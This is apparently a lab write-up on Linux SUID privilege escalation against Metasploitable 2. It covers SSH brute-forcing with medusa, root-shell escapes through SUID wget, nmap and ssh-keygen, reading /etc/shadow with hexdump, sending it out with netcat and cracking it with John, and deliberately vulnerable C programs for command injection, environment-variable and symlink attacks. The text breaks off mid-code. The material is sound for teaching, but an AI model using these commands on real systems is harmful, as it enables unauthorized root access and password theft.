<h1 align="center"> SUID Exploitation </h1>


<img width="1000" height="500" alt="linux-special-permission-suid-guid-sticky-bit" src="https://github.com/user-attachments/assets/63e9c660-5a7a-44ee-a858-e88e86ff63e1" />

---

## Content Tables:
- [Visual Identification](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#visual-identification)
- [Finding SUID Binaries](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#finding-suid-binaries)
- [Security Issues with SUID](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#security-issues-with-suid)
- [Real User ID, Effective User ID, Saved User ID](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#real-user-id-effective-user-id-saved-user-id)
- [SUID Binary](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#suid-binary)
- [SUID Exploitation (wget)](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#suid-exploitation-wget)
- [hexdump](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#hexdump)
- [ss-keygen](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#ssh-keygen)
- [REal_world Exploitation](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#real-world-exploitation)
  - [Vulnerable Custom SUID Binary](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#victims-vulnerable-program-vulnc)
  - [Environment Variable Attack](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#environment-variable-attack)
  - [Symbolic Link Attack:](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#symbolic-link-attack)
  - [refuses to follow symlinks](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/4.%20SUID_Exploitation.md#refuses-to-follow-symlinks)






## What is SUID Exploitation?
**SUID Exploitation**: is a classic Linux privilege escalation technique: it leverages misconfigured binaries with the Set User ID (SUID) bit set to gain higher privileges, often root.

## What is SUID?
SUID (Set User ID): is a special permission bit in Unix/Linux systems  that allows a user to execute a file with the permissions of the file’s owner, rather than the user who is running it.


### Why SUID Can Be Dangerous
- If a binary with SUID root allows arbitrary command execution or is poorly coded, a low‑privileged user can exploit it to run commands as root.
- Attackers look for unexpected or custom SUID binaries beyond the usual system ones.

#### The Problem:
If a SUID binary has vulnerabilities or can be manipulated, attackers can:
1. Execute arbitrary commands as the file owner (usually root)
2. Read protected files
3. Write to system directories
4. Gain persistent access


#### Common Vulnerability Patterns:
1. Shell escape - Binary spawns a shell
2. Command injection - User input not sanitized
3. Path manipulation - Related to PATH hijacking
4. Library hijacking - LD_PRELOAD attacks
5. Symbolic link attacks - Race conditions




### The Power of SUID:
- Normal execution: `user → program → runs as user`
- SUID execution: user → `program → runs as owner (often root)`



# SUID Exploitation Methodology:

- So in this i test with my metasploitable 2. 

- First in this i need to Scan my target that open port `SSH` or not:

````
nmap -sV -T4 192.168.127.0/24
````
<img width="1574" height="395" alt="image" src="https://github.com/user-attachments/assets/72737d20-fa26-495c-bbb0-227d2756ea8e" />

<img width="1122" height="691" alt="image" src="https://github.com/user-attachments/assets/fe430af0-8196-4521-bac5-97ab6d59854e" />

- Now i see my target open port `SSH`.

- So this our target:
<img width="978" height="538" alt="image" src="https://github.com/user-attachments/assets/5b0c8351-a51a-4447-b375-afa40051f2c5" />



- After i need to brute force this SSH service:
````
medusa -h 192.168.127.129 -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -M ssh -t 5 -f
````
<img width="1547" height="252" alt="image" src="https://github.com/user-attachments/assets/cdb70020-93fb-46cc-ac2a-4de93e0e0bef" />

- Now we got the correct `Username` and `Password`.


- First i need to login to target `SSH` port:
````
ssh msfadmin@192.168.127.129
````
<img width="1724" height="115" alt="image" src="https://github.com/user-attachments/assets/78c01882-f5dd-4022-a2cb-de99f64f4ad7" />

- Now f it show this, it mean we need to explicitly tell your SSH client to allow those older algorithms:
````
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.127.129
````
<img width="1546" height="621" alt="image" src="https://github.com/user-attachments/assets/59b9074c-f4ce-4367-ba55-5e0de2ebd8f8" />

- Now i got success to login to our target.

- Or if the server only supports DSA:
````
ssh -o HostKeyAlgorithms=+ssh-dss msfadmin@192.168.127.129
````

````
whoami
````
<img width="535" height="62" alt="image" src="https://github.com/user-attachments/assets/d358b3ba-fc9b-41a9-ba9a-7a8490ed4100" />

---


## Visual Identification:
- SUID files have 's' in the owner execute position:
````
ls -lh /usr/bin/passwd
````
<img width="935" height="95" alt="image" src="https://github.com/user-attachments/assets/7c27c598-6867-4b8b-9768-ae5652ffa2b1" />

- `ls`:  list information about files.
- `-l`: long format (shows permissions, owner, group, size, date, filename).
- `-h`: - human‑readable sizes (e.g., `12K` instead of `12288`).
- **This command systems detailed info about the `passwd` binary in `/usr/bin`.**

- We the result:
````
-rwsr-xr-x 1 root root 29K 2008-04-02 21:08 /usr/bin/passwd
````
- `-rwsr-xr-x`:
  - `-`: it’s a regular file.
  - `rws`: owner (root) has read, write, and execute permissions. The s here is the SUID bit.
  - `r-x`: group has read and execute.
  - `r-x`: others have read and execute.
  - Key point: The `s` means when anyone runs this file, it executes with the privileges of the file’s owner (root)
- `1`: number of hard links.
- `root root`: owner is root, group is root.
- `2008-04-02 21:08`: last modification date.
- `/usr/bin/passwd`: The file name.

- Why `/usr/bin/passwd` Has SUID:
  - The `passwd` program lets normal users change their own passwords.
  - Passwords are stored in `/etc/shadow`, which is only writable by root.
  - To allow users to update their password securely, `passwd` runs with root privileges via the SUID bit.
  - This is a legitimate use of SUID — not a misconfiguration



````
ls -lh /etc/shadow
````
<img width="900" height="67" alt="image" src="https://github.com/user-attachments/assets/97e72b61-dc7f-4d78-8a5b-7af136ecfd5b" />

- To set a SUID bit we can use `chmod`.
- In this we cannot do anything on this file, cause it needed `root`.

- We the result:
````
-rw-r----- 1 root shadow 1.3K 2025-09-11 21:30 /etc/shadow
````
- **Owner**: `root`
- **Group**: `shadow`
- **Permission**:
  - `rw-`: for ownerr -> `root` can read and write
  - `r--`: for group -> members of the `shadowy` group can read.
  - `---`: for others -> no access.
- Purpose of `/etc/shadow`:
  Stores hashed passwords for all user accounts. It’s one of the most sensitive files on the system
 

#### Check if we can read **/etc/shadow**:
````
cat /etc/shadow
````
<img width="678" height="101" alt="image" src="https://github.com/user-attachments/assets/1dc6d989-c634-4b43-ae17-3ef0f79db6d5" />

- If we get permission denied -> normal behavior.
- If we can read it -> **Misconfiguration** or we are already in a privileged group.


---


## Understanding SUID Permissions

### Permission Representation:
````
Regular file: -rwxr-xr-x
SUID file:    -rwsr-xr-x
              ^
              |
              's' instead of 'x' = SUID bit set
````
SUID with Numbers:
  - SUID = 4 in the special permissions position
  - Standard permission 755 = 0755
  - SUID permission 4755 = rwsr-xr-x

---




## Why SUID Exists (Legitimate Users):

### Common Legitimate SUID Programs:

#### Password management:
````
/usr/bin/passwd
````
- Needs to write to `/etc/shadow` (root only).

#### System administration
````
/usr/bin/sudo
````
<img width="902" height="61" alt="image" src="https://github.com/user-attachments/assets/8977aba0-a439-4022-815b-caea404e76dd" />




#### Netwroking 
````
/bin/ping
````
````
ls -lh /bin/ping
cat /bin/ping
````
<img width="850" height="93" alt="image" src="https://github.com/user-attachments/assets/1d440e06-ae99-4513-b3a5-aa618b2291c4" />

<img width="1915" height="825" alt="image" src="https://github.com/user-attachments/assets/445de3eb-2465-442a-b1a1-6f3a56a3be11" />



#### File system:
````
/bin/mount
````
````
ls -lha
cat /bin/mount
````
<img width="1894" height="694" alt="image" src="https://github.com/user-attachments/assets/99d21abd-b785-4218-99b4-1833f5709de4" />





## Finding SUID Binaries:

### Basic Enumeration

#### Find all SUID file:
````
find / -type f -perm -4000 2>/dev/null
````
<img width="611" height="571" alt="image" src="https://github.com/user-attachments/assets/c692cf74-3a02-41ff-9926-b824b45101f9" />



#### Find SUID files owned by root (most dangerous):
````
find / -type f -perm -4000 -user root 2>/dev/null
````
<img width="634" height="575" alt="image" src="https://github.com/user-attachments/assets/8b477601-20bb-49a4-ba35-867c0403dc03" />


#### Find SUID files with detailed info
````
find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
````
<img width="776" height="594" alt="image" src="https://github.com/user-attachments/assets/390a86b4-b9ed-4570-9915-2798832bcac8" />



#### Find SGID files too

````
find / -type f -perm -2000 2>/dev/null
````
<img width="556" height="358" alt="image" src="https://github.com/user-attachments/assets/1373a785-6f0d-4380-99f8-16dabd68fa14" />


---


### Organized Enumeration Script:
````
nano suid_scan.sh
````
````
#!/bin/bash
echo "========== SUID BINARIES =========="
find / -type f -perm -4000 2>/dev/null | while read file; do
    echo -n "$file: "
    ls -la "$file" | awk '{print $3" "$4" "$1}'
done

echo -e "\n========== POTENTIALLY DANGEROUS =========="
dangerous_suid=("bash" "sh" "cp" "mv" "find" "nano" "vim" "more" "less" "awk" "python" "perl" "ruby")
for cmd in "${dangerous_suid[@]}"; do
    find / -type f -perm -4000 -name "*$cmd*" 2>/dev/null
done
````
<img width="828" height="314" alt="image" src="https://github.com/user-attachments/assets/e6877215-bb6e-4bf9-9834-a92820207f85" />

#### Make it executable:
````
chmod +x suid_scan.sh
./suid_scan.sh
````
<img width="510" height="739" alt="image" src="https://github.com/user-attachments/assets/6a9fbe76-8ce4-42d2-bf85-da20a7c1aa64" />

#### Why this useful:
- Enumeration phase: Quickly identifies escalation paths.
- Dangerous binaries: Editors, interpreters, and utilities that can spawn shells or execute commands are prime targets.
- Portfolio impact: Shows you can automate reconnaissance with custom scripts.


---




## Security Issues with SUID:
### What **/etc/shadow** contains:
- **Hashed passwords** for all local user accounts.
- Each line correcsponds to a user and incudes:
  - Username
  - Password Hash
  - Password aging info (Last change, expirattion)


### Security Issues If Misconfigured
1. Readable by unauthorized users
- If a low-privileged user can read `/etc/shadow`, they can:
  - Extract password hashes.
  - Use tools like **John the Ripper** or **Hashcat** to crack them offline.
- This is a critical vulnerability — cracked hashes = full account access.
2. Writable by unauthorized users
- If writable, an attacker could:
  - Replace their own hash with a known one (e.g., hash of `root:toor`).
  - Gain root access without brute force.
- This is **game over** for system integrity.
3. Group membership abuse
- If a user is in the `shadow` group, they can read the file.
- Always audit group memberships with `id` or `groups`.


### Security Issues with SUID
Having a binary that runs as the owner of the file can be problematic when the owner of said file is the root user.
More specifically, we might be able to:
- Read files owned by root
- Read and write files owned by root
- Execute arbitrary code as the root user

- If a low-privileged user can trigger a SUID binary that interacts with files or executes commands, and the binary is owned by root, it opens the door to privilege escalation.

---




## Real User ID, Effective User ID, Saved User ID:
To understand the role of SUID, it is important to understand that we have three different types of user IDs for any process being executed.

- Real User ID: Who you really are, and therefore who owns the process.
- Effective User ID: What the operating system looks at to make authorization decisions, i.e., whether or not you are allowed to do something.
- Saved User ID: Used when a program running with elevated privileges needs to do some unprivileged work temporarily.


An unprivileged process may set its effective user ID to one of only three values:
- The value of the real user ID (`ruid`)
- The value of the saved user ID (`suid`)
- The value of the effective user ID (`euid`)

---





## SUID Binary
### Save the code:
Create s file called `suid_demo.c`:
- First in this we need to tempoarily switch to a simpler type that metasploit understand:
````
export TERM=xterm
````
````
nano suid_demo.c
````
````
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

int main(int argc, char *argv[]) {
    uid_t uid = getuid();    // Real User ID
    uid_t eid = geteuid();   // Effective User ID

    printf("-----------------------------\n");
    printf("[INFO] - Real     user ID: %d\n", uid);
    printf("[INFO] - Effective user ID: %d\n", eid);
    printf("-----------------------------\n");

    execv("/usr/bin/touch", (char *[]) {"/usr/bin/touch", "hello", NULL});

    return 0;
}
````
<img width="428" height="64" alt="image" src="https://github.com/user-attachments/assets/92b365f3-b5ff-4f58-9f0b-f7b8cf8d3638" />


<img width="961" height="533" alt="image" src="https://github.com/user-attachments/assets/eab642d2-4e4a-47fe-b894-6abfc7f447af" />

- After if we want to exit, Press`Ctrl + O` -> `Enter` -> `Ctrl + X`.


### Complie the code:
Use `gcc` to compile it:
````
gcc suid_demo.c -o suid_demo
````
<img width="481" height="57" alt="image" src="https://github.com/user-attachments/assets/6b0d999e-6445-4af1-b104-ee780938dba9" />

````
ls -lh
````
<img width="756" height="207" alt="image" src="https://github.com/user-attachments/assets/22190bca-42b0-4c0c-b61c-64d22cbfa63b" />


### Make it Owned by Root:
````
sudo chown root:root suid_demo
````
<img width="535" height="116" alt="image" src="https://github.com/user-attachments/assets/dfef968d-e102-426a-a982-a6dab5e108cc" />


### Set the SUID Bit:
- Give the binary the SUID permission:
````
sudo chmod u+s suid_demo
ls -lh suid_demo
````
<img width="753" height="233" alt="image" src="https://github.com/user-attachments/assets/b487bea4-c3aa-44ca-8568-976de197a568" />

````
-rwsr-xr-x 1 root     root     6.8K 2025-12-03 03:53 suid_demo
````
- `-rwsr-xr-x`:
  - `rws`: owner (root) has read, write, execute, and the SUID bit (s).
  - `r-x`: group has read and execute.
  - `r-x`: others have read and execute.
- `root root`: owned by root, group root.
- `6.8K`: file size.
- `suid_demo`: your compiled binary.





### Run the binary as **msfadmin**:
- Execute it directly:
````
./suid_demo
````
<img width="417" height="166" alt="image" src="https://github.com/user-attachments/assets/51567efa-2abc-41db-92ad-a9008eba86e4" />

- After we should see a file called `hello` created in your current directory.

````
ls -lha
````
<img width="957" height="491" alt="image" src="https://github.com/user-attachments/assets/3e06687f-7987-4664-8151-2c85fb958f09" />

- We will see:
````
-rw-r--r-- 1 root     msfadmin    0 2025-12-03 04:03 hello
````
- `-rw-r--r--`: File permissions
  - `rw-`: owner (root) can read and write
  - `r--`: group (msfadmin) can read
  - `r--`: others can read
- `1`: number of hard links.
- `root`: file owner (user).
- `msfadmin`: file group.
- `0`: file size (empty file).
- `2025-12-03 04:03`: timestamp when created.
- `hello`: filename

### What It Means in Context
- The file `hello` was created by your SUID demo binary.
- Even though you ran it as `msfadmin`, the effective UID was root, so the file is owned by root.
- The group is still `msfadmin` because that’s your primary group.
- The file is empty (`0` bytes) because `touch` just creates an empty file



#### **In this i suggests to view this website:** https://gtfobins.github.io/
This website have a lots binary to exploit.
<img width="1139" height="766" alt="image" src="https://github.com/user-attachments/assets/332a1fcd-e624-4fd5-96dd-e9e0e468093c" />

- If we click on `SUID`:
<img width="802" height="954" alt="image" src="https://github.com/user-attachments/assets/991d5226-1354-4e94-adb7-4fc0827b2f4a" />

<img width="825" height="738" alt="image" src="https://github.com/user-attachments/assets/950552f4-9f28-4202-be4f-de0f1bf3f513" />


---



## SUID Exploitation: wget

### Install **wget** with SUId: 
````
sudo install -m =xs $(which wget) .
ls
````
<img width="891" height="172" alt="image" src="https://github.com/user-attachments/assets/356eac93-d1ab-4e19-a679-d7a59e6fcf2a" />


- `install`: copies the binary to our current directory.
- `-m=xs`: Sets permissions to executable `x` and SUID `s`.
- The new `wget` binary will run with root privileges if owned by root.


### Craete a malicious Askpasss scipr:
````
TF=$(mktemp)                                        # Create a temp file
chmod +x $TF                                        # Make it executable
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
cat $TF
````
<img width="759" height="165" alt="image" src="https://github.com/user-attachments/assets/9de9c57a-4bd7-4c5a-91c3-d54b7ecb0568" />

- This script spawns a root shell using `-p` to preserve privileges.
- `1>&0` redirects output to your terminal.


### Trgger the exploit:
````
./wget --use-askpass=$TF 0
````
<img width="672" height="105" alt="image" src="https://github.com/user-attachments/assets/27aac091-ab80-4f45-8942-dc967a684ead" />


- `wget` tries to fetch a URL (`0` is a dummy).
- `--use-askpass` tells it to use your script to “ask for a password.”
- Your script doesn’t ask — it just spawns a shell.


- If **wget** is SUID root, this command gives you a **root shell**.

- If it show this it mean: we’re doing everything right in terms of setup, but the issue is simple: Metasploitable’s version of `wget` is too old and does not support the `--use-askpass` option. That’s why you’re seeing:
````
wget: unrecognized option `--use-askpass=...`
````

### Why This Exploit Works on Modern Systems
The `--use-askpass` trick works on newer versions of `wget` (like those found in Arch, Kali, or Ubuntu 20+), because they support graphical password prompts via `--use-askpass`. If you point that option to a malicious script, it gets executed with elevated privileges — but only if the binary is SUID root and supports that flag

- Check Version:
````
wget --version
````
<img width="715" height="202" alt="image" src="https://github.com/user-attachments/assets/a21b90cb-e4a2-4269-936e-7d73d909abe1" />

- We see version:
````
GNU Wget 1.10.2
````
- That version doesn’t support `--use-askpass`. The exploit only works on versions like `1.21+`.


### Try a different SUID 
````
find / -perm -4000 -type f 2>/dev/null
````
<img width="683" height="697" alt="image" src="https://github.com/user-attachments/assets/ab9edaf6-33e3-454f-b03b-66c7c4273c5f" />

- Look for:
  - `vim`, `less`, `cp`, `bash`, `python`, `perl`, `find`, `nmap`, `tcpdump`, etc.
  - If any of these are SUID root, they might be exploitable.

- But in this i see  `/usr/bin/nmap` → Very interesting — older versions of nmap include an interactive mode (`--interactive`) that can drop you into a root shell.


### Test Exploitable SUID Binaries
````
nmap --interactive
````
<img width="590" height="188" alt="image" src="https://github.com/user-attachments/assets/f10d88ed-b1df-4faf-a22b-1501f8e5ce3b" />

- If it drops you into an interactive shell (`nmap>` prompt), type:


````
!sh
````
<img width="590" height="188" alt="image" src="https://github.com/user-attachments/assets/e69dbb98-f395-4d7f-8d34-f7f116c16612" />


- This spawns a root shell because `nmap` is running with effective UID = root.
- **Now in this we got root.**


---



## hexdump:

### Install
````
sudo install -m =xs $(which hexdump) .
````
<img width="704" height="77" alt="image" src="https://github.com/user-attachments/assets/60566aef-c9ea-4a54-a887-b05943e615b1" />

- `install` copies the binary to your current directory.
- `-m =xs` sets it to executable (`x`) and SUID (`s`).
- The new `hexdump` binary will run with root privileges.


- Check:
````
ls -lh
ls -lh hexdump
````
<img width="937" height="378" alt="image" src="https://github.com/user-attachments/assets/ed5a729f-a804-4c2f-b07a-0f08fd9116ca" />


### Choose a File to Read:
- Pick a file you normally can’t read, like:
````
LFILE=/etc/shadow
````
<img width="527" height="108" alt="image" src="https://github.com/user-attachments/assets/134a6187-a248-4cce-ad03-942c3c7bc384" />


### Run the Exploit:
````
./hexdump -C "$LFILE"
````
<img width="817" height="716" alt="image" src="https://github.com/user-attachments/assets/cfdc7afb-a33c-40e5-97ac-7e7066a45b5a" />

<img width="808" height="744" alt="image" src="https://github.com/user-attachments/assets/43e0817a-0393-4530-88da-ca0264d036c4" />


- where `LFILE=/etc/shadow`.
- The output shows **hashed passwords** and account metadata for system users like:
  - `root`
  - `daemon`
  - `bin`
  - `sys`
  - `sync`
  - And more ...

 
````
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
````
- `$1$`: indicates MD5 hashing.
- The long string after `$1$` is the **hashed password**.
- The rest are fields for password aging and account policies



````
sudo chmod u-s ./hexdump
ls -lh ./hexdump
````
<img width="605" height="144" alt="image" src="https://github.com/user-attachments/assets/e4786f69-cfdd-4fb8-b9ab-43e935ee095c" />


### Crack the Hashes

#### Save them into a file:
````
sudo cat /etc/shadow > shadow.txt
ls
cat shadow.txt
````
<img width="781" height="737" alt="image" src="https://github.com/user-attachments/assets/45576100-005c-4407-836e-54c260dde9db" />

<img width="718" height="353" alt="image" src="https://github.com/user-attachments/assets/a09379e2-ae14-4053-8e96-68d32751dd1c" />



#### Use John the Ripper or Hashcat:
But first i need to copy shadow.txt file from metasploitable 2 to kali:

- On kali (reciever):
````
nc -lvp 4444 > shadow.txt
````
<img width="326" height="123" alt="image" src="https://github.com/user-attachments/assets/08e7dc08-e87b-4e3a-93f3-d5f83e6fd20e" />

- Keep this running - It listen and saves incoming data.

- **On Metaploitable 2**:
````
sudo cat /etc/shadow | nc -q 0 192.168.127.128 4444
````
<img width="821" height="92" alt="image" src="https://github.com/user-attachments/assets/d5d18e58-dd65-4051-a0ae-9c3374212797" />

- After go back to our kali:
<img width="586" height="107" alt="image" src="https://github.com/user-attachments/assets/79a5ec3b-ba4b-4c3c-9217-b93353cc7290" />

- Check:
````
ls -lh shadow.txt
````
<img width="474" height="111" alt="image" src="https://github.com/user-attachments/assets/810aa843-a8ea-4f2e-8830-4c2bc18662be" />

````
cat shadow.txt
````
<img width="630" height="641" alt="image" src="https://github.com/user-attachments/assets/8904223a-9843-4dd0-ba82-acdd2e9b8273" />

- Now we get success to get shadow file.



- But in this i used **John** to crack:
````
john shadow.txt --format=md5crypt
````
<img width="927" height="337" alt="image" src="https://github.com/user-attachments/assets/bce369a0-984a-4209-bb9c-850296b05189" />

- Now we got successful to get password hash.

- Login with **postgres**:
````
su postgres
````
<img width="766" height="190" alt="image" src="https://github.com/user-attachments/assets/f62ed872-729b-4831-890b-0293ad216807" />

- Password: `postgres`.
<img width="491" height="86" alt="image" src="https://github.com/user-attachments/assets/896081fc-9ed9-419a-b886-9bf2d31f2ebc" />


- Login with **sys**:
<img width="530" height="218" alt="image" src="https://github.com/user-attachments/assets/ae484ca0-e235-4389-93ec-617052df9620" />

- Password: `batman`.


---



## ssh-keygen

### Install
````
sudo install -m =xs $(which ssh-keygen) .
````
<img width="768" height="166" alt="image" src="https://github.com/user-attachments/assets/caee7891-a233-42c1-b501-901ff7f4ce7b" />

- Check:
````
ls -lh ssh-keygen
````
<img width="603" height="97" alt="image" src="https://github.com/user-attachments/assets/3bf01e68-ebc2-4dca-8c20-d876c7cc8264" />



### Create payload for SUID ssh-keygen injection:
````
nano lib.c
````
````
<img width="637" height="334" alt="image" src="https://github.com/user-attachments/assets/4e8c2257-1871-4565-9b22-06a9b018997c" />

````
<img width="972" height="171" alt="image" src="https://github.com/user-attachments/assets/f8a93390-4e62-44df-ac32-0b402c5a641c" />

<img width="492" height="112" alt="image" src="https://github.com/user-attachments/assets/a41aba17-6ac2-45a2-bc9f-e63b3f4ffe82" />

````
ls -lh lib.c
````
<img width="492" height="112" alt="Screenshot 2025-12-03 182246" src="https://github.com/user-attachments/assets/17d01d80-4d3e-4836-9531-4d22f2f59921" />

- To exit and save press `Ctrl + O` -> `Enter` -> `Ctrl + X`.


### Compile the share object
````
gcc -shared -nostartfiles -fPIC -o lib.so lib.c
````
<img width="642" height="93" alt="image" src="https://github.com/user-attachments/assets/b58ecf57-1261-48bb-84eb-551afb9ec450" />

- `-shared`: create `.so` file
- `-nostartfiles`: skip default startup code
- `-fPIC`: position-independent code

- Now if we check we will see `root`.


### Trigger the exploit
````
./ssh-keygen -D ./lib.so
````
<img width="458" height="69" alt="image" src="https://github.com/user-attachments/assets/85fdf04e-867b-4bb2-a0f0-6c6b5afa302c" />

- The `-D` option tells `ssh-keygen` to load a PKCS#11 shared library.
- Because `ssh-keygen` is SUID root, it will load your `lib.c` with root privileges.
- Your `_init()` function inside `lib.c` should execute immediately, spawning a root shell.

- If it not support.

### Try another vulnerable SUID binary
````
nmap --interactive
!sh
````
<img width="503" height="167" alt="image" src="https://github.com/user-attachments/assets/d5b4764e-4db4-42a4-82a8-9a61c4b70cd2" />

- Now we got `root` shell.

---




## **Real-World Exploitation**

### Vulnerable Custom SUID Binary

#### Victim's Vulnerable Program (vuln.c):
````
nano vuln.c
````
````
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char command[100];
    
    // Vulnerable: user input directly in system()
    if(argc > 1) {
        strcpy(command, "echo ");
        strcat(command, argv[1]);
        system(command);  // DANGER: Command injection!
    }
    
    return 0;
}
````
<img width="622" height="329" alt="image" src="https://github.com/user-attachments/assets/626ea605-3a5a-46d5-bf04-0b77698f9fa0" />

- To exit press `Ctrl + O` -> `Enter` ->  `Ctrl + X`.


### Compliled as SUID:
````
gcc vuln.c -o vuln
sudo chown root:root vuln
sudo chmod 4755 vuln
````
<img width="937" height="190" alt="image" src="https://github.com/user-attachments/assets/6b4fa572-21d0-405b-a4ba-e584f9094fda" />




### Exploitation:

#### Command injection
````
./vuln "hello; whoami"
````
<img width="443" height="103" alt="image" src="https://github.com/user-attachments/assets/bb2516b8-a596-43ec-a418-25c38d86d103" />

- Now we see we can use command injection and get `root`.

#### Get shell:
````
./vuln "hello; /bin/sh -p"
````
<img width="968" height="199" alt="image" src="https://github.com/user-attachments/assets/f31d5571-7353-499a-ae75-cb1860b4214e" />

- Now we got target `root shell`.


---



### Environment Variable Attack

#### Vulnerable Program (env_vuln.c):
````
nano env_vuln.c
````
````
#include <stdlib.h>

int main() {
    char* editor = getenv("EDITOR");
    if(editor) {
        system(editor);
    }
    return 0;
}
````
<img width="631" height="248" alt="image" src="https://github.com/user-attachments/assets/35c46a87-0c13-4b33-b686-a7cfe35b62c3" />

````
ls
````
<img width="913" height="136" alt="image" src="https://github.com/user-attachments/assets/78bc8cbd-8cff-422b-8ad6-b4b50b98b530" />

- To exit press `Ctrl + O` -> `Enter` -> `Ctrl + X`.

````
gcc env_vuln.c -o env_vuln
````
<img width="756" height="418" alt="image" src="https://github.com/user-attachments/assets/b8ee84bc-7cc0-430f-adb3-feaad073a31d" />

````
chmod +x env_vuln
````
<img width="399" height="72" alt="image" src="https://github.com/user-attachments/assets/c4574e08-f475-43d6-9421-349430a613ff" />


#### Set **env_vuln** to owned by root and have the SUID bit set:
````
sudo chown root:root ./env_vuln
sudo chmod u+s ./env_vuln
ls -l ./env_vuln
````
<img width="647" height="182" alt="image" src="https://github.com/user-attachments/assets/5b6277ec-d08e-4ea6-8696-97ff7f4dd68d" />



#### Exploitation:
````
export EDITOR="/bin/sh -p"
./env_vuln
````
<img width="973" height="166" alt="image" src="https://github.com/user-attachments/assets/29855b74-5780-4c4f-bc2f-82924945bf00" />

- Now we got `root` shell.

---




### **Symbolic Link Attack**:

#### Vulnerable Program (symlink_vuln.c):


##### Create a harmless **sensitive** file:
````
echo "ORIGINAL_SECRET" | sudo tee /opt/secret.txt
````
<img width="660" height="71" alt="image" src="https://github.com/user-attachments/assets/28a8edbd-1559-4b10-a8c8-3a6887368a73" />

- **Why**: This simulates a protected file you should not be able to modify as a normal user.


##### Source:
````
nano symlink_vuln.c
````
````
#include <stdio.h>
#include <unistd.h>

int main() {
    FILE *fp = fopen("/tmp/tempfile", "w");
    if (fp) {
        fprintf(fp, "Data from root\n");
        fclose(fp);
    }
    return 0;
}
````
<img width="695" height="308" alt="image" src="https://github.com/user-attachments/assets/2c967232-1e3e-44d0-bbd3-f8d6ef5101da" />

- To exit Press `Ctrl + O` -> `Enter` -> `Ctrl + X`.


##### Complie:
````
gcc symlink_vuln.c -o symlink_vuln
````
<img width="562" height="90" alt="image" src="https://github.com/user-attachments/assets/8a0af69b-ed6e-4749-9384-626e3bf9f6dc" />


##### Set it to owned
````
sudo chown root:root symlink_vuln
sudo chmod u+s symlink_vuln
ls -la symlink_vuln
````
<img width="523" height="111" alt="image" src="https://github.com/user-attachments/assets/7732d7ad-aa5b-4c6d-893a-470b2292879a" />



#### Exploitation:
````
ln -sf /opt/secret.txt /tmp/tempfile
ls -l /tmp/tempfile
````
<img width="715" height="95" alt="image" src="https://github.com/user-attachments/assets/7ba588f3-3122-43ad-8842-c7698d3acd9e" />



````
./symlink_vuln
cat /otp/secret.txt
````
<img width="426" height="85" alt="image" src="https://github.com/user-attachments/assets/f0d897e9-9618-4e07-921f-ba7205f6c873" />


- Check file metadata:
```` 
ls -la /otp/secret.txt
````
<img width="511" height="105" alt="image" src="https://github.com/user-attachments/assets/eeb97dd4-28b3-4207-883f-cb247e21f2c8" />

- Now we see `root` shell.

---



### refuses to follow symlinks

#### Create a secure file directory:
````
sudo mkdir -p /var/lib/myapp
sudo chown root:root /var/lib/myapp
sudo chmod 700 /var/lib/myapp
````
<img width="543" height="100" alt="image" src="https://github.com/user-attachments/assets/a623c7bb-3352-4b51-869f-5e893fb83720" />

````
sudo ls -lh /var/lib/myapp
````
<img width="487" height="92" alt="image" src="https://github.com/user-attachments/assets/7fff8f9e-ea09-478d-9b7e-914b6db205c8" />


#### Create file:
````
nano secure_writer.c
````
````
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>

// Define O_NOFOLLOW if it's missing (older libc versions)
#ifndef O_NOFOLLOW
#define O_NOFOLLOW 0100000
#endif

int main() {
    struct stat st;
    const char *safe = "/var/lib/myapp/tempfile"; // root-owned, 0700 dir

    // Check if target is a symlink
    if (lstat(safe, &st) == 0 && S_ISLNK(st.st_mode)) {
        fprintf(stderr, "Refusing to write to symlink\n");
        return 1;
    }

    // Open file securely, refusing to follow symlinks
